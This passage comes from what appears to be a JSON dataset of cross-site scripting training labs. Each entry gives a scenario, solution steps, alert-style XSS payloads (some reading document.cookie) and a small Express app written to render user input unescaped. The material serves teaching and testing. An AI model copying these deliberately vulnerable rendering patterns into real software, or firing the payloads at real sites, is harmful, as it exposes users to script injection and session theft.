    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send('<form method=\"POST\"><input name=\"subject\"><textarea name=\"message\"></textarea><button>Send</button></form>'); }); app.post('/feedback', (req, res) => { feedback.push(req.body.subject); res.redirect('/staff/emails'); }); app.get('/staff/emails', (req, res) => { const subjects = feedback.map(s => `<div>${s}</div>`).join(''); res.send(`<html><body>${subjects}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Profile Tagline in Social Networking Site",
    "Lab Description": "A social networking platform lets users write a short 'tagline' that appears below their username. The tagline is stored and rendered without escaping, making it possible to inject JavaScript. To solve: Inject a payload in the tagline field and visit the user profile page to confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to your profile edit page.",
      "Update the tagline with an XSS payload.",
      "Visit your public profile page.",
      "Inspect how the tagline is injected into the page.",
      "Confirm XSS execution in the rendered profile."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tagline = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/edit-profile', (req, res) => { res.send('<form method=\"POST\"><input name=\"tagline\"><button>Save</button></form>'); }); app.post('/edit-profile', (req, res) => { tagline = req.body.tagline; res.redirect('/profile'); }); app.get('/profile', (req, res) => { res.send(`<html><body><h1>User</h1><p>${tagline}</p></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Booking Notes on Travel Confirmation Page",
    "Lab Description": "A travel booking app allows users to leave optional notes for hotel staff. These notes appear unfiltered in the booking confirmation page after checkout. The system fails to sanitize HTML or JavaScript in this field. To solve: Inject a payload as the note, complete the booking, and confirm script execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Book a room and leave an XSS payload in the 'special requests' field.",
      "Complete the reservation process.",
      "View the booking confirmation page.",
      "Inspect the location of the note reflection.",
      "Trigger and verify the XSS payload."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>",
      "<script>alert(document.domain)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let notes = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/book', (req, res) => { res.send('<form method=\"POST\" action=\"/confirm\"><input name=\"note\"><button>Book</button></form>'); }); app.post('/confirm', (req, res) => { notes = req.body.note; res.redirect('/confirmation'); }); app.get('/confirmation', (req, res) => { res.send(`<html><body><h2>Booking Confirmed</h2><div>${notes}</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Internal Chat Mentions Feature",
    "Lab Description": "An internal messaging system auto-links @mentions in chat messages. However, it processes message content using a replace function without escaping dangerous characters, allowing injection of script tags. To solve: Send a chat message containing an XSS payload that gets executed in the chat history.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open the internal chat panel.",
      "Send a message containing a crafted @mention XSS payload.",
      "Observe how the message gets rendered with improper escaping.",
      "Trigger XSS via auto-linking logic.",
      "Verify payload execution in chat history."
    ],
    "payloads": [
      "@<script>alert(1)</script>",
      "@<img src=x onerror=alert(1)>",
      "@<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/chat', (req, res) => { const chat = messages.map(m => m.replace(/@(\\w+)/g, '<a href=\"/user/$1\">@$1</a>')).join('<br>'); res.send(`<html><body>${chat}<form method=\"POST\"><input name=\"msg\"><button>Send</button></form></body></html>`); }); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Address Field in Delivery Tracking App",
    "Lab Description": "A delivery tracking platform displays user-supplied addresses on a tracking page. The address input is not encoded before being inserted into a div container, allowing attackers to inject HTML or JavaScript. To solve: Inject a payload into the address field and trigger it via the tracking page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a delivery request with a malicious address value.",
      "Visit the tracking page for that delivery.",
      "Inspect how the address appears in the DOM.",
      "Inject and test a payload that triggers XSS.",
      "Verify successful execution of the script."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(document.domain)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let address = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/new-delivery', (req, res) => { res.send('<form method=\"POST\"><input name=\"address\"><button>Track</button></form>'); }); app.post('/track', (req, res) => { address = req.body.address; res.redirect('/tracking'); }); app.get('/tracking', (req, res) => { res.send(`<html><body><h1>Tracking Info</h1><div>${address}</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Task Name Field of Project Management Dashboard",
    "Lab Description": "A project management tool allows users to add tasks, and the task name is rendered directly in the dashboard without output encoding. The dashboard uses a JavaScript templating engine that does not sanitize content. To solve: Inject a script into the task name and confirm execution in the rendered dashboard view.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the task creation page.",
      "Create a new task with an XSS payload in the task name.",
      "View the dashboard where the task list is rendered.",
      "Confirm the task name appears with injected content.",
      "Verify that the payload executes in the context of the dashboard."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/add-task', (req, res) => { res.send('<form method=\"POST\"><input name=\"task\"><button>Add</button></form>'); }); app.post('/add-task', (req, res) => { tasks.push(req.body.task); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const html = tasks.map(t => `<li>${t}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in 'Company Bio' Field of Job Posting Portal",
    "Lab Description": "A job portal allows companies to publish job listings with a 'company bio' field that is reflected unescaped in the job description page. This bio is stored as-is and injected directly into the HTML body. To solve: Craft a malicious bio, view the job post page, and confirm payload execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the job posting form.",
      "Submit a job with a crafted XSS payload in the company bio field.",
      "Visit the job details page.",
      "Confirm that the payload appears in the DOM without sanitization.",
      "Trigger and verify JavaScript execution."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(document.domain)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let jobs = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/post-job', (req, res) => { res.send('<form method=\"POST\"><input name=\"bio\"><button>Post</button></form>'); }); app.post('/post-job', (req, res) => { jobs.push(req.body.bio); res.redirect('/jobs'); }); app.get('/jobs', (req, res) => { const jobHtml = jobs.map(j => `<div>${j}</div>`).join(''); res.send(`<html><body>${jobHtml}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Comment Field on Online Course Reviews",
    "Lab Description": "An educational platform allows users to leave reviews. The comment content is rendered directly without sanitization on the course page. This results in stored XSS if malicious input is submitted. To solve: Submit a malicious comment and view it on the course detail page to confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit a course and leave a comment with a script payload.",
      "Submit the form and return to the course detail view.",
      "Inspect how the comment is reflected in the HTML.",
      "Confirm the injection point and trigger XSS.",
      "Validate script execution in the user session."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/course', (req, res) => { const content = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<html><body>${content}<form method=\"POST\"><input name=\"comment\"><button>Comment</button></form></body></html>`); }); app.post('/course', (req, res) => { comments.push(req.body.comment); res.redirect('/course'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Newsletter Preview Feature Using User Bio",
    "Lab Description": "A newsletter creation tool allows insertion of dynamic user bios into the newsletter preview. The bio is fetched and embedded without encoding, leading to XSS if a user injects malicious content. To solve: Modify your bio with a payload and generate a preview that triggers the XSS.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Edit your user profile to include a script in the bio.",
      "Navigate to the newsletter builder and create a new campaign.",
      "Enable dynamic content preview and insert the user bio tag.",
      "Generate a preview and inspect how the bio is rendered.",
      "Verify XSS payload execution in the preview pane."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert(1)>",
      "<img src=x onerror=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let bio = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/edit-bio', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"bio\"></textarea><button>Save</button></form>'); }); app.post('/edit-bio', (req, res) => { bio = req.body.bio; res.redirect('/preview'); }); app.get('/preview', (req, res) => { res.send(`<html><body><h2>Preview</h2><div>${bio}</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Search Query Parameter on Product Listing Page",
    "Lab Description": "An e-commerce website reflects the search query parameter in the product listing title. The query is injected without proper sanitization inside a heading tag. To solve: Inject a payload through the search box and confirm its execution when the search results page is rendered.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the product search page.",
      "Submit a search query containing an XSS payload.",
      "Observe how the input is reflected in the results title.",
      "Trigger and confirm execution of the script.",
      "Verify that it runs within the same context as the application."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "\"><img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><h1>Results for: ${q}</h1></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in 'Name' Field of Event Registration Confirmation Page",
    "Lab Description": "An event management system takes the user's name from the registration form and reflects it directly in the confirmation message. The message is built using string concatenation in the HTML response without encoding. To solve: Inject a payload through the name field and confirm script execution on the confirmation page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the event registration form.",
      "Submit the form with a malicious script in the 'name' field.",
      "Observe how the name is reflected in the confirmation message.",
      "Confirm that the payload executes upon page load.",
      "Verify that JavaScript context is achieved."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(document.domain)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/register', (req, res) => { res.send('<form method=\"POST\"><input name=\"name\"><button>Register</button></form>'); }); app.post('/register', (req, res) => { const name = req.body.name; res.send(`<html><body>Thank you, ${name}, for registering!</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in 'Location' Field on Public Event Listings",
    "Lab Description": "A community site lists public events and includes the location submitted by the event organizer. The location is rendered without HTML encoding in a map tooltip. To solve: Inject a script into the location field and confirm its execution in the tooltip.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a new event with a malicious location payload.",
      "View the event listing with the embedded map.",
      "Hover over the map marker to trigger the tooltip.",
      "Check how the location appears in the DOM.",
      "Confirm that the payload executes in the tooltip context."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<script>alert(document.domain)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let events = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/add-event', (req, res) => { res.send('<form method=\"POST\"><input name=\"location\"><button>Add</button></form>'); }); app.post('/add-event', (req, res) => { events.push(req.body.location); res.redirect('/events'); }); app.get('/events', (req, res) => { const html = events.map(loc => `<div title=\"${loc}\">Event</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Embedded Message in Internal Messaging System",
    "Lab Description": "An internal messaging tool allows users to send HTML messages. These are rendered as-is without sanitization, allowing stored XSS. To solve: Send a crafted message to another user, then view the inbox to confirm execution.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Log in and navigate to the message composer.",
      "Send a message containing a script tag.",
      "Log in as the receiving user.",
      "Open the inbox and view the crafted message.",
      "Confirm execution of the script."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/compose', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"msg\"></textarea><button>Send</button></form>'); }); app.post('/compose', (req, res) => { messages.push(req.body.msg); res.redirect('/inbox'); }); app.get('/inbox', (req, res) => { const html = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Feedback Widget on Documentation Portal",
    "Lab Description": "A feedback widget on a documentation portal takes user input and displays it immediately for confirmation without any encoding. The feedback preview reflects unescaped HTML. To solve: Submit a script in the feedback and confirm it executes on the preview page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open a page with the feedback widget.",
      "Enter a script payload in the feedback form.",
      "Click submit to preview the message.",
      "Inspect how the preview is rendered.",
      "Confirm payload execution in the preview frame."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"msg\"></textarea><button>Submit</button></form>'); }); app.post('/feedback', (req, res) => { const msg = req.body.msg; res.send(`<html><body><h3>Preview</h3><div>${msg}</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in 'Favorite Quote' Section of User Profile",
    "Lab Description": "A social platform allows users to save and display a favorite quote in their profile. The quote is stored and rendered without escaping, resulting in stored XSS. To solve: Set a quote with a script tag, visit your profile, and observe payload execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to your profile settings.",
      "Set a favorite quote with an XSS payload.",
      "Visit your public profile page.",
      "Inspect how the quote is displayed.",
      "Confirm that the script executes in the browser."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert(document.domain)>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let quote = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/edit-profile', (req, res) => { res.send('<form method=\"POST\"><input name=\"quote\"><button>Save</button></form>'); }); app.post('/edit-profile', (req, res) => { quote = req.body.quote; res.redirect('/profile'); }); app.get('/profile', (req, res) => { res.send(`<html><body><h1>Favorite Quote</h1><p>${quote}</p></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via 'Company' Field on Job Posting Portal",
    "Lab Description": "A job posting form allows employers to specify a company name that is displayed on job listings. The company name is rendered using raw HTML with no sanitization. To solve: Inject a script in the company name and confirm it executes on the listing page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the job posting page and fill the form with a script in the company field.",
      "Submit the job and navigate to the public listing.",
      "Check how the company name appears in the listing.",
      "Observe if the payload is rendered as executable code.",
      "Verify alert or DOM modification triggered."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert(1)>",
      "<img src=x onerror=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let jobs = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/post-job', (req, res) => { res.send('<form method=\"POST\"><input name=\"company\"><button>Post</button></form>'); }); app.post('/post-job', (req, res) => { jobs.push(req.body.company); res.redirect('/jobs'); }); app.get('/jobs', (req, res) => { const html = jobs.map(c => `<div>Posted by ${c}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Product Review Section of E-commerce Platform",
    "Lab Description": "A review form on an e-commerce product page allows users to leave feedback that is displayed publicly. The review content is rendered as HTML without escaping. To solve: Submit a review containing a script payload and observe its execution on the product page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit any product page and locate the review form.",
      "Post a review with an embedded script payload.",
      "Refresh the product page and scroll to the review section.",
      "Observe how the review content is rendered.",
      "Confirm execution of JavaScript in the browser."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let reviews = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/product', (req, res) => { res.send(`<form method=\"POST\"><textarea name=\"review\"></textarea><button>Submit</button></form>${reviews.map(r => `<div>${r}</div>`).join('')}`); }); app.post('/product', (req, res) => { reviews.push(req.body.review); res.redirect('/product'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via Hash Fragment Injection in Help Page",
    "Lab Description": "A single-page help center loads content dynamically based on the URL hash and injects it into the page using `innerHTML`. This allows attackers to inject scripts by manipulating the hash. To solve: Craft a URL with a malicious hash and confirm script execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open the help page and observe how content loads using the hash.",
      "Modify the URL hash with a script payload.",
      "Observe the dynamic injection of the content using JavaScript.",
      "Check how the DOM is updated based on the hash value.",
      "Confirm the script executes on page load or hash change."
    ],
    "payloads": [
      "#<img src=x onerror=alert(1)>",
      "#<svg/onload=alert('XSS')>",
      "#<script>alert(document.domain)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><div id=\"content\"></div><script>document.getElementById('content').innerHTML = location.hash.slice(1);</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in URL Parameter Reflected in Error Message",
    "Lab Description": "An application displays error messages using a URL parameter for user input. The input is reflected in the message directly without escaping. To solve: Inject a payload in the query parameter and trigger the error message to confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the error page using a malformed input URL.",
      "Inject a payload into the vulnerable query parameter.",
      "Observe how the parameter is reflected in the response.",
      "Inspect if the output is directly inserted into the DOM.",
      "Confirm script execution by triggering a visible alert."
    ],
    "payloads": [
      "?error=<script>alert('XSS')</script>",
      "?error=<img src=x onerror=alert(1)>",
      "?error=<svg/onload=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/error', (req, res) => { const err = req.query.error || 'Unknown Error'; res.send(`<html><body><h2>Error: ${err}</h2></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Notes Feature of Task Manager App",
    "Lab Description": "Users can add custom notes to their tasks. The notes are stored and rendered without HTML sanitization. This allows stored XSS. To solve: Save a malicious script in the note, reload the tasks page, and confirm execution.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Create a new task and include a script in the note field.",
      "Save the task and reload the task list.",
      "Observe how the note content is rendered on the page.",
      "Check for script execution in the note display.",
      "Verify successful XSS execution by observing the alert or DOM modification."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert(1)>",
      "<img src=x onerror=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let notes = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/tasks', (req, res) => { const list = notes.map(n => `<li>${n}</li>`).join(''); res.send(`<html><body><ul>${list}</ul><form method=\"POST\"><input name=\"note\"><button>Add Note</button></form></body></html>`); }); app.post('/tasks', (req, res) => { notes.push(req.body.note); res.redirect('/tasks'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "CMS Plugin Store XSS in Plugin Preview Renderer",
    "Lab Description": "The CMS provides a plugin marketplace where users can preview plugin UI before installation. The preview renders server-fetched plugin metadata including the 'description' field directly into the DOM using innerHTML. No sanitization is applied, allowing attackers to inject scripts via a crafted plugin.json file. To solve: Upload a malicious plugin and trigger preview rendering to execute JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a plugin.json file with a malicious description field.",
      "Upload it to the CMS plugin store endpoint.",
      "Navigate to the plugin preview screen.",
      "Observe unsafe rendering of plugin metadata.",
      "Trigger XSS payload in plugin description."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert(document.domain)</script>",
      "<svg/onload=confirm('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const fileUpload = require('express-fileupload'); const app = express(); app.use(fileUpload()); app.use(express.static('uploads')); const fs = require('fs'); app.post('/upload-plugin', (req, res) => { const file = req.files.plugin; file.mv('./uploads/' + file.name, () => { res.redirect('/preview?plugin=' + file.name); }); }); app.get('/preview', (req, res) => { const pluginPath = './uploads/' + req.query.plugin; const plugin = JSON.parse(fs.readFileSync(pluginPath)); res.send(`<html><body><div id='desc'></div><script>document.getElementById('desc').innerHTML = '${plugin.description}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Event Management Panel XSS in Attendee Name",
    "Lab Description": "An event admin panel allows CSV import of attendee data, which includes names and contact details. The imported names are rendered using innerHTML inside a table. No validation is applied during parsing, permitting injection through the 'name' field. To solve: Craft a malicious CSV and upload it to trigger script execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a CSV file with attendee name containing an XSS payload.",
      "Import the file through the admin upload portal.",
      "Review the attendee list rendered in a table.",
      "Confirm unsafe rendering of the name field.",
      "Trigger script execution via XSS."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const multer = require('multer'); const fs = require('fs'); const csv = require('csv-parser'); const app = express(); const upload = multer({ dest: 'uploads/' }); app.post('/upload-attendees', upload.single('file'), (req, res) => { const results = []; fs.createReadStream(req.file.path).pipe(csv()).on('data', (data) => results.push(data)).on('end', () => { let rows = results.map(a => `<tr><td>${a.name}</td><td>${a.email}</td></tr>`).join(''); res.send(`<html><body><table>${rows}</table></body></html>`); }); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Chatbot Integration XSS via User Alias",
    "Lab Description": "A helpdesk chatbot uses user-defined aliases to personalize responses. These aliases are stored in local storage and rendered in the chat window using innerHTML. The alias input is not sanitized, enabling XSS through alias injection. To solve: Inject a payload into the alias field and trigger it by sending a message.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set a malicious alias using the user settings panel.",
      "Trigger the chatbot to use the alias in a reply.",
      "Observe the alias being rendered unsafely.",
      "Confirm JavaScript execution through alias XSS."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('Bot')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); let alias = 'User'; app.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/chat'); }); app.get('/chat', (req, res) => { res.send(`<html><body><div id='chatbox'></div><script>document.getElementById('chatbox').innerHTML = 'Hello, ${alias}!';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Online Resume Builder via Experience Field",
    "Lab Description": "The application provides a live preview of resumes, rendering JSON input fields like 'experience' into a preview section. The server returns these fields directly, and the frontend uses dangerouslySetInnerHTML to render them. The 'experience' field allows injected markup. To solve: Inject JavaScript via this field and observe execution on preview.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a resume entry with malicious input in the experience field.",
      "Access the preview panel for the resume.",
      "Observe that the experience field is rendered unsafely.",
      "Trigger XSS and verify execution."
    ],
    "payloads": [
      "<script>alert('Resume')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const resumes = {}; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit', (req, res) => { resumes[req.body.id] = req.body.experience; res.redirect('/preview?id=' + req.body.id); }); app.get('/preview', (req, res) => { const experience = resumes[req.query.id] || ''; res.send(`<html><body><div id='exp'></div><script>document.getElementById('exp').innerHTML = '${experience}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Knowledge Base Editor XSS in Markdown Preview",
    "Lab Description": "The internal knowledge base editor supports Markdown preview, rendering raw HTML if included in markdown. The editor does not sanitize input before rendering preview, allowing embedded scripts. To solve: Craft malicious markdown and trigger preview to confirm script execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the editor page and write markdown with embedded HTML/JS.",
      "Click 'Preview' to render it in the DOM.",
      "Observe that script tags are executed.",
      "Confirm successful XSS in preview component."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); app.get('/editor', (req, res) => { res.send(`<html><body><form method='POST' action='/preview'><textarea name='markdown'></textarea><button type='submit'>Preview</button></form></body></html>`); }); app.post('/preview', (req, res) => { res.send(`<html><body><div id='preview'>${req.body.markdown}</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Student Portal XSS in Course Feedback Field",
    "Lab Description": "A university portal allows students to submit course feedback, which is displayed to professors via a dashboard. The feedback content is inserted directly into a DOM container using innerHTML without sanitization. To solve: Inject a payload through the feedback field and trigger execution when a professor views it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with a crafted XSS payload.",
      "Access the professor's dashboard interface.",
      "Observe rendering of feedback without escaping.",
      "Trigger XSS via the feedback field.",
      "Confirm successful execution."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert('Prof')</script>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const feedbacks = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.feedback); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const list = feedbacks.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Project Management Tool XSS via Project Title",
    "Lab Description": "In a collaborative project tool, users can name projects and view them in a list. Project titles are rendered with innerHTML directly into the interface. Input is not sanitized, leading to potential DOM XSS. To solve: Create a project with a malicious title and view it on the dashboard.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create a new project with an XSS payload in the title.",
      "Navigate to the project listing page.",
      "Confirm that the payload is rendered unsafely.",
      "Trigger and verify JavaScript execution."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=confirm('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const projects = []; app.use(express.urlencoded({ extended: true })); app.post('/add-project', (req, res) => { projects.push(req.body.title); res.redirect('/projects'); }); app.get('/projects', (req, res) => { const list = projects.map(p => `<div>${p}</div>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "File Tracker XSS via Filename Display",
    "Lab Description": "A file management tool displays recently uploaded filenames using dangerouslySetInnerHTML in a React component. The backend does not sanitize filenames, and attackers can upload files with embedded scripts. To solve: Upload a file with a malicious name and view it in the recent uploads panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload a file with a malicious script embedded in the filename.",
      "Navigate to the recent uploads page.",
      "Observe unsafe rendering using dangerouslySetInnerHTML.",
      "Trigger the XSS payload from filename.",
      "Confirm execution."
    ],
    "payloads": [
